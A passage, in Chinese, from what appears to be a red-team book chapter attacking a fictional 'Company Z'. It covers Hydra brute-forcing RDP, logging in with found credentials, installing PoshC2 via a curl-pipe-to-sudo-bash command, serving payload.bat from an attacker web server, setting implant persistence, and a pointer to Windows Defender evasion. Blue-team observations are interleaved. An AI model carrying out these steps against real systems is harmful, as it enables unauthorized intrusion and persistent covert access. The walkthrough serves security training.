

```
[DATA] max 4 tasks per 1 server, overall 4 tasks, 827172 login tries (1:828/p:999), ~206793 tries per task

[DATA] attacking rdp://10.0.0.157:3389/

[STATUS] 1040.00 tries/min, 1040 tries in 00:01h, 826133 to do in 13:15h, 4 active

[STATUS] 1050.33 tries/min, 3151 tries in 00:03h, 824022 to do in 13:05h, 4 active

[STATUS] 1053.57 tries/min, 7375 tries in 00:07h, 819798 to do in 12:59h, 4 active
...
```

如你所见，这将耗时很长（超过13小时）。但在红队演练中，我们有时间——目标是进入系统，而不是求快。

不过，Hydra 最终会找到一组可用于该服务器的凭据，如下所示：

```
...
[3389] [rdp] host: 10.0.0.157  login: reports_user  password: Password1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-22 17:31:19
```

请注意，用户名和密码本身并不罕见，但必须找到两者的组合，才使得此类攻击的挑战性大大增加，耗时也更长。如果你能预先掌握其中一项——用户名或密码——那将极大地有所帮助。

令我困惑的是，现代 Windows 系统在默认安装时竟然仍然允许使用 `Password1` 这样简单的密码。

为了展示这种攻击的嘈杂程度，请看下面的截图，它展示了我们执行字典攻击时企业防火墙的运行日志：

![](img/c8ffa9959721097701584fcc95101362_621_0.png)

图16.2 – 暴力破解攻击期间的防火墙日志

其中有数千条到 RDP 服务器的成功连接记录。

有了用户名和密码，接下来让我们攻击*Z公司*的企业网络。

## 蓝队观察

与我们之前执行端口扫描时产生的事件一样，成功连接的日志常常会与其他日志混杂在一起，除非专门查找此类事件，否则很难被发现。但令人警惕的是，服务器暴露出来，可以从互联网访问。一定是有人配置了企业防火墙，允许通过 3389 端口进行入站连接。这可能是残留的端口例外，仅仅因为选择了错误的 IP 地址而导致内部服务器暴露。

这里给蓝队的三点启示是：

- 蓝队的**安全信息和事件管理/安全运营中心（SOC）**解决方案应进行调整，以开始显示过多的成功连接。
- 企业防火墙的防火墙规则需要定期审查和验证。
- 应建立一个暴露 IP 地址监控服务。像**Shodan的** `https://monitor.shodan.io/` 这样的服务会密切关注公司暴露的服务器/服务的变化，并针对这些变化发出警报。

## 初始立足点 – 攻陷企业网络

我们现在有了一组可用的凭据，可以登录*Z公司*的 RDP 服务器。我们将使用一个名为 **Remmina** 的 Linux RDP 客户端来完成此操作。Remmina 不会随 Kali Linux 默认安装，因此我们需要使用以下命令来安装它：

```
sudo apt install remmina
```

现在我们可以启动 Remmina 并指定远程服务器和凭据，如下所示：

![](img/c8ffa9959721097701584fcc95101362_623_0.png)

点击**保存并连接...**，我们就进去了！这通过以下截图得以确认：

![](img/c8ffa9959721097701584fcc95101362_623_1.png)

现在，我们该如何利用新获得的访问权限？很可能有人会发现错误并关闭防火墙例外，或禁用此服务器上的 RDP 服务。此外，RDP 会话很难保持隐秘——我们很可能会意外暴露自己的存在。我们需要建立一种隐秘的方式进入系统，同时也要能持久化，以防 RDP 访问方式消失。实现这些需求的方式是使用一个日益流行的**命令与控制（C2）**框架：**PoshC2**。

### 使用 PoshC2 建立进入 Z 公司企业网络的持久且隐蔽的连接

本节并非要作为使用 PoshC2 框架的完整教程，因为许多在线资源都可以提供帮助。我们只是要浅尝辄止地了解该工具的功能。不过，我建议熟悉 PoshC2，因为它正被攻击者越来越多地使用。

我们使用 C2 设置的原因是为了利用植入体——安装在目标系统上的小型代理程序，它们允许我们在受感染系统和 C2 服务器之间建立隐蔽信道。植入体内置了多种功能，帮助我们执行各种攻击和活动，非常适合隐蔽侦察。此外，C2 环境支持设置持久化，并可以帮助我们扩展和穿越目标网络，所有这些都可以方便地在 C2 指挥中心终端中完成。让我们看看 PoshC2 的实际使用，但在此之前，我们需要先安装它。要安装 PoshC2，我们从 Kali Linux **虚拟机（VM）** 运行以下命令：

```bash
curl -sSL https://raw.githubusercontent.com/nettitude/PoshC2/master/Install.sh | sudo bash
```

这一条命令就能完成所有 PoshC2 文件的安装。

PoshC2 的安装程序完成后，我们必须使用 posh-project -n Book_ENT-C2 创建一个项目，如下面的截图所示，之后我们可以使用 posh-server 启动 C2 服务器：

![](img/c8ffa9959721097701584fcc95101362_625_0.png)

图16.5 – PoshC2 服务器启动并运行

如图16.5的输出所示，PoshC2 会生成各种负载，并将它们存储在 /var/poshc2/Book_ENT-C2/payloads/ 文件夹中。我们将把这些负载复制到 Kali Linux 机器的 /var/www/html/files/payloads 文件夹中，以便通过 apache2 Web 服务器将其暴露。以下输出显示了负载文件的复制和 apache 服务的启动：

```
$ sudo mkdir /var/www/html/files/
$ sudo cp /var/poshc2/Book_ENT-C2/payloads/ /var/www/html/files -r
$ sudo service apache2 start
```

就这样，我们准备从 Z 公司的终端服务器上获取一个合适的 PoshC2 植入体负载。

在我们进入测试服务器的 RDP 会话中，打开 Internet Explorer 并导航到 http://222.222.222.222/files，如下图所示：

![](img/c8ffa9959721097701584fcc95101362_626_0.png)

图16.6 – Kali Web 服务器上的 PoshC2 负载列表

让我们保持简单，下载 `payload.bat` 文件。这是一个批处理文件，它将运行 PoshC2 的 PowerShell 版本的植入体。你可以在下面的截图中看到下载过程：

![](img/c8ffa9959721097701584fcc95101362_627_0.png)

图16.7 – 已下载的 Payload.bat

如果我们用记事本打开（编辑）`payload.bat` 文件，可以看到该批处理文件的内容，如下所示：

![](img/c8ffa9959721097701584fcc95101362_627_1.png)

图16.8 – payload.bat 的内容

运行它时，我们可以看到植入体回连到 Kali 机器上的 PoshC2 服务器，如下所示：

![](img/c8ffa9959721097701584fcc95101362_627_2.png)

图16.9 – PoshC2 植入体连接到服务器

> **注意**
> 
> 在某些 Windows Server 系统上，植入体的部分内容会被 Windows Defender 标记。为避免检测，请按照本文中的说明操作：https://github.com/nettitude/PoshC2/issues/164。

现在，我们已通过 PoshC2 植入体建立了连接，首先要做的事情是设置持久化，这样即使目标重启或我们意外失去连接，植入体也会自动开始尝试重新连接 PoshC2 服务器。要与 PoshC2 植入体交互，我们需要在新的终端窗口中运行 posh，如下所示：

![](img/c8ffa9959721097701584fcc95101362_628_0.png)

我们可以通过输入植入体 ID（8）开始与植入体交互。这会带我们进入 `\implant` 命令菜单。从这里运行 `install-persistence`，让 PoshC2 在目标上设置一个持久化植入体，如下所示：

```
TEST_REPORTSSER\reports_user @ TEST_REPORTSSER (PID:2188)
PS 8> install-persistence
```

这会安装持久化模块，如 posh-server 终端中所示：

![](img/c8ffa9959721097701584fcc95101362_628_1.png)

我们现在拥有了一条可靠的通向 Z 公司企业网络的后门。是时候开始探索环境了。

### 蓝队观察

在攻击的这一点上，如果蓝队的工具被调校为可发现进入企业网络的连接，那么他们应该开始看到一些异常。看到来自互联网的入站 RDP 连接绕过非军事区（DMZ）进入企业网络，应该非常可疑。另外，对通过超文本传输协议（HTTP）进行的下载进行监控也是一项措施，但实施起来更难。诸如 BAT、EXE、SYS 等可执行文件格式应引起警惕。这很难实施，因为误报的可能性很大。

